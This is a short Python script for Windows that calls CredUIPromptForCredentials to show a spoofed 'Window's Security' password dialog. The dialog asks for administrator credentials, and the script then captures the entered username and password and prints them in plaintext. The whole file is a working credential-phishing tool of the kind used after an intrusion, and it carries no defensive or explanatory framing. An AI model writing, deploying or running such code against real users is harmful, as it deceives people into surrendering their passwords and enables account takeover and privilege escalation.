import os
import socket
import win32cred


REQUEST_ADMIN_FLAG = 0x00004

def cred_prompt():
    username = os.getlogin()
    host = socket.gethostname()
    ui_opts = {"Parent": None, "MessageText": "Please enter the credentials for ", "CaptionText": "Window's Security", "Banner": None}
    data = win32cred.CredUIPromptForCredentials(host, 0, username, None, False, REQUEST_ADMIN_FLAG, ui_opts)
    account_name = data[0]
    password = data[1]
    result = f"Account Name: {account_name} Password: {password}"
    return result


def main():
    creds = cred_prompt()
    print(creds)

if __name__=="__main__":
    main()
